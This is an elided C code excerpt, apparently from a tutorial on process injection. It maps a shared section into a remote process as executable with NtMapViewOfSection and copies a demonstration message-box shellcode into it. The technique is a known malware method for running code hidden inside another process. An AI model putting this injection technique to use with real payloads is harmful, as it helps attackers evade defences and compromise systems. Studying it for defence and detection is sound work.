...
INT main() {
	...
	ntStatus = pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalSectionAddress, NULL, NULL, NULL, &dwReqBufSize, 2, NULL, PAGE_READWRITE);
	if (!NT_SUCCESS(ntStatus)) {
		return ntStatus;
	}
	...
	ntStatus = pNtMapViewOfSection(hSection, hProcess, &pRemoteSectionAddress, NULL, NULL, NULL, &dwReqBufSize, 2, NULL, PAGE_EXECUTE_READ);
	if (!NT_SUCCESS(ntStatus)) {
		lRetVal = ntStatus;
		goto Cleanup;
	}
	...
	memcpy(pLocalSectionAddress, bMessageboxShellcode64, dwReqBufSize);
